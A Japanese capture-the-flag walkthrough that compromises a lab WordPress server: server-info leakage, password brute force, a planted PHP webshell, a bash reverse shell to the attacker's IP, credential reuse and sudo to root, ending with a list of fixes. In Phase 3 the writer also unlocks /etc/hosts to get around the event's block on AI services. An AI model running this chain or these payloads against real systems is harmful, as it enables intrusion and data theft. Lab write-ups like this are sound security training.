# SNet CTF Round 2 Walkthrough

## Overview

| Item | Detail |
|------|--------|
| Target | 10.0.1.20 (Rocky Linux, Apache/2.4.62) |
| Attacker | 10.0.1.10 (Kali Linux) |
| Entry Point | テストサイト (test.ironguard-clinic.local) |
| Attack Chain | server-info漏洩 → テストサイトWPブルートフォース → File Manager → webshell → SSH → sudo → root |
| Flags | user.txt: `FLAG{wordpress_plugins_need_updates}` / root.txt: `FLAG{snet_security_is_a_joke}` |

---

## Phase 1: Reconnaissance

### 1. ネットワークスキャン
```bash
nmap -sn 10.0.1.0/24
```
- 10.0.1.2 (gateway)
- 10.0.1.5 (Claude OVA)
- 10.0.1.10 (Kali - 自分)
- 10.0.1.20 (Target)

### 2. ポートスキャン
```bash
nmap -sV 10.0.1.20
```
| Port | Service | Version |
|------|---------|---------|
| 21 | FTP | ProFTPD or KnFTPD |
| 22 | SSH | OpenSSH 8.7 |
| 80 | HTTP | Apache httpd (PHP 8.0.30) |
| 443 | HTTPS | Apache httpd |
| 3306 | MySQL | MariaDB 5.5.5-10.5.29 |

Round 1と同じポート構成。今回は443(HTTPS)とMariaDB(3306)に注目。

---

## Phase 2: HTTPS調査 → server-info漏洩

### 3. HTTPS(443)の確認
```bash
curl -k https://10.0.1.20/
```
→ ディレクトリリスティング（空）。HTTPの本番WordPressとは別のバーチャルホスト。

### 4. gobusterでHTTPS側を探索
```bash
gobuster dir -u https://10.0.1.20 -w /usr/share/wordlists/dirb/common.txt -k
```
→ `server-status` (200) と `server-info` (200) を発見。

### 5. server-infoからApache設定を取得
```bash
curl -k https://10.0.1.20/server-info
```
→ Apache設定ファイルが丸見え。以下の設定を発見：

```
In file: /etc/httpd/conf.d/test-ironguard.conf
  <VirtualHost *:80>
    ServerAdmin webmaster@ironguard-clinic.example
    DocumentRoot /home/webuser/test_site
    ServerName test.ironguard-clinic.local
```

**テストサイト** `test.ironguard-clinic.local` の存在を確認。DocumentRootは `/home/webuser/test_site`。

**脆弱性:** server-info/server-statusが `Require all granted` で無制限公開。Zabbix監視用に開けていたとのこと。

---

## Phase 3: テストサイトへのアクセス

### 6. Hostヘッダーでテストサイトにアクセス
```bash
curl -H "Host: test.ironguard-clinic.local" http://10.0.1.20/
```
→ WordPress 5.8.10 "IronGuard Test" が応答。本番サイトとは別のWPインスタンス。

### 7. /etc/hosts の編集（ブラウザアクセス用）
```bash
sudo chattr -i /etc/hosts  # immutable属性の解除が必要だった
echo "10.0.1.20 test.ironguard-clinic.local" | sudo tee -a /etc/hosts
```

**備考:** KaliのVMでは `/etc/hosts` に `chattr +i` でimmutable属性が設定されており、AIサービスやパッケージレジストリへのアクセスがブロックされていた（SNet CTFのAI使用制限機能）。

---

## Phase 4: テストサイトのWordPress調査

### 8. wpscanでユーザー列挙
```bash
wpscan --url http://test.ironguard-clinic.local/ -e ap,at,u
```
→ ユーザー `admin` を発見。本番サイトの `clinic_admin`/`yamada` とは異なるユーザー。

### 9. プラグインのアグレッシブスキャン
```bash
wpscan --url http://test.ironguard-clinic.local/ -e ap --plugins-detection aggressive
```
→ 10個のプラグインを発見：

| Plugin | Version | Note |
|--------|---------|------|
| akismet | 不明 | - |
| all-in-one-wp-migration | 7.80 | バックアップ/移行ツール |
| autoptimize | 3.1.10 | キャッシュ |
| cloudflare | 4.12.0 | CDN |
| duplicate-post | 4.4 | 投稿複製 |
| insert-headers-and-footers | 2.1.0 | ヘッダー編集 |
| mw-wp-form | 4.4.5 | フォーム（CVE-2023-36000対象） |
| relevanssi | 4.22.0 | 検索 |
| wp-mail-smtp | 3.11.0 | メール |
| wpvivid-backuprestore | 0.9.90 | バックアップ |

### 10. Round 1クレデンシャルの再利用試行
WPログイン画面で以下を試行 → すべて失敗：
- admin / medicare
- admin / medicine1
- admin / Welc0me2024!

---

## Phase 5: ブルートフォース → WP管理画面侵入

### 11. XML-RPCブルートフォース
```bash
wpscan --url http://test.ironguard-clinic.local/ -U admin -P /usr/share/wordlists/rockyou.txt
```
→ 約22分で成功：**`admin / test1234`**

**脆弱性:** テスト環境の管理者パスワードが極めて弱い。XML-RPCが有効でブルートフォースが可能。

### 12. WP管理画面ログイン
ブラウザで `http://test.ironguard-clinic.local/wp-login.php` にアクセス。
- Username: `admin`
- Password: `test1234`

→ 管理者権限でログイン成功。

---

## Phase 6: ウェブシェル設置

### 13. テーマエディタ — 失敗
404.phpにPHPコードを挿入しようとしたが、WPのファイル編集保護機能により巻き戻された。
> "unable to communicate back with site to check for fatal errors, so the php change was reverted"

### 14. プラグインアップロード — 失敗
PHPウェブシェルをZIPにしてプラグインとしてアップロード → fatal errorで拒否。

### 15. All-in-One WP Migrationでバックアップエクスポート
管理画面から All-in-One WP Migration → Export → File でサイト全体のバックアップ (.wpress) をダウンロード。

### 16. データベース調査
Round 1で取得済みのDBクレデンシャルでテストサイトのDBを発見：
```bash
mysql -h 10.0.1.20 -u clinicwp -pmedicine1 --skip-ssl -e "SHOW DATABASES;"
```
```
+--------------------+
| Database           |
+--------------------+
| clinicwpdb         |
| clinicwpdb_test    |
| information_schema |
+--------------------+
```

**脆弱性:** テストサイトのDBが本番と同じクレデンシャルでアクセス可能。

### 17. WP File Managerプラグインのインストール
WP管理画面 → Plugins → Add New → "File Manager" を検索 → インストール・有効化。

→ サーバー上のファイルをブラウザから直接操作可能に。wp-config.phpも閲覧可能。

### 18. ウェブシェルの設置
File Managerで `/home/webuser/test_site/health.php` を作成：
```php
<?php if(isset($_GET['cmd'])){system($_GET['cmd']);} ?>
```

### 19. RCE確認
```bash
curl "http://test.ironguard-clinic.local/health.php?cmd=id"
```
```
uid=1002(webuser) gid=1002(webuser) groups=1002(webuser) context=system_u:system_r:httpd_t:s0
```

---

## Phase 7: user.txt取得

### 20. リバースシェル接続
```bash
# Kali（リスナー）
tmux new-session -s attack
rlwrap nc -lvnp 4444

# 別ターミナルから発火
curl "http://test.ironguard-clinic.local/health.php?cmd=bash+-c+'bash+-i+>%26+/dev/tcp/10.0.1.10/4444+0>%261'"
```

### 21. user.txt取得
```bash
cat /home/webuser/user.txt
```
→ `FLAG{wordpress_plugins_need_updates}`

---

## Phase 8: 権限昇格 → root

### 22. DB経由でsupportクレデンシャル取得
```bash
mysql -h 10.0.1.20 -u clinicwp -pmedicine1 --skip-ssl clinicwpdb \
  -e "SELECT * FROM wp21c261_system_accounts;"
```
→ `support / Welc0me2024!` を確認（Round 1と同じDB情報を別ルートから再取得）。

### 23. SSH接続
```bash
ssh support@10.0.1.20
# Password: Welc0me2024!
```

### 24. root権限取得
```bash
sudo su -
```

### 25. root.txt取得
```bash
cat /root/root.txt
```
→ `FLAG{snet_security_is_a_joke}`

---

## Phase 9: ダンプスターダイビング（Post-Exploitation）

### 26. /root/ のゴミ漁り
```bash
ls -la /root/
```
→ 複数の興味深いファイルを発見。

### 27. _chat.log — イースターエッグ
SNet開発者とAIの開発チャットログ。CORRUPTED SECTORに偽装されたbase64メッセージを発見：
```bash
echo "VGhlIHJlYWwgdnVsbmVyYWJpbGl0eSB3YXMgbmV2ZXIgaW4gdGhlIHNlcnZlci4gSXQgd2FzIGluIHRoZSBhc3N1bXB0aW9uIHRoYXQgbm9ib2R5IHdvdWxkIGxvb2sgaGVyZS4=" | base64 -d
```
> "The real vulnerability was never in the server. It was in the assumption that nobody would look here."

### 28. passwords.txt — セキュリティ調査メモ
実際には「パスワード」ではなく、サーバー管理者が書いたセキュリティ調査メモ。全脆弱性の種明かし：
- wp-config.php_bk が公開ディレクトリに放置
- uploadsディレクトリでPHP実行可能
- カーネル5.14.0-427（CVE-2024-1086該当）
- MariaDB外部公開
- テストサイト放置
- SSH鍵の管理不備
- supportアカウント残存

Slackログも含まれており、管理会社の対応のずさんさが記録されていた。

### 29. misc/ 内のTODOメモ
```
- [ ] テストサイト消す → 来月やる
- rocky の sudo は一時的にNOPASSWDにしてる。戻すの忘れないこと
```
→ 全TODO未完了。Round 3以降の攻略ヒント。

---

## 発見した脆弱性一覧（Round 2）

| # | 脆弱性 | 深刻度 | パッチ方針 |
|---|--------|--------|-----------|
| 1 | server-info/server-status 無制限公開 | 高 | Require ip でZabbixサーバーのみに制限 |
| 2 | テストサイトが本番と同居 | 高 | テストサイト削除、VirtualHost設定削除 |
| 3 | テストサイトWP管理者パスワードが弱い (test1234) | 高 | 強固なパスワードに変更 |
| 4 | XML-RPCが有効 | 中 | xmlrpc.phpへのアクセスをブロック |
| 5 | WPプラグインの自由なインストール | 中 | DISALLOW_FILE_MODS を true に設定 |
| 6 | All-in-One WP Migrationでエクスポート可能 | 中 | プラグイン削除 or エクスポート制限 |
| 7 | テストDBと本番DBが同じクレデンシャル | 中 | テストDB用に別ユーザーを作成 |
| 8 | supportアカウントがsudo ALL権限で残存 | 高 | アカウント削除 or sudo権限剥奪 |
| 9 | DBにシステムアカウントの平文パスワード保存 | 高 | テーブル削除、パスワードはハッシュ化 |

---

## Round 1との比較

| 項目 | Round 1 | Round 2 |
|------|---------|---------|
| 入口 | 本番サイト (HTTP/80) | テストサイト (server-info経由で発見) |
| 初期アクセス | 既存webshell (shell.php) | WPブルートフォース + File Manager |
| 情報収集 | robots.txt | server-info (Apache設定漏洩) |
| WPクレデンシャル | clinic_admin / medicare (hashクラック) | admin / test1234 (ブルートフォース) |
| webshell設置 | 既に存在していた | File Manager経由で新規作成 |
| 横展開 | DB → support平文パスワード | 同左（別ルートから同じDB情報に到達） |
| 権限昇格 | support → sudo su | 同左 |

---

## 使用ツール

| Tool | Purpose |
|------|---------|
| nmap | ホストディスカバリ、ポートスキャン |
| gobuster | ディレクトリ列挙 |
| curl | HTTP/HTTPS リクエスト |
| wpscan | WordPress脆弱性スキャン、ブルートフォース |
| mysql | MariaDB接続、DB調査 |
| searchsploit | エクスプロイト検索 |
| tmux + rlwrap + nc | リバースシェル |
| WP File Manager | ウェブシェル設置（ブラウザ経由） |
| All-in-One WP Migration | サイトバックアップエクスポート |
| base64 | イースターエッグのデコード |

---

## 所要時間

- 偵察〜テストサイト発見: 約30分
- ブルートフォース: 約22分
- WP管理画面〜ウェブシェル: 約30分
- 権限昇格〜root: 約10分
- ダンプスターダイビング: 約20分
- **合計: 約2時間**
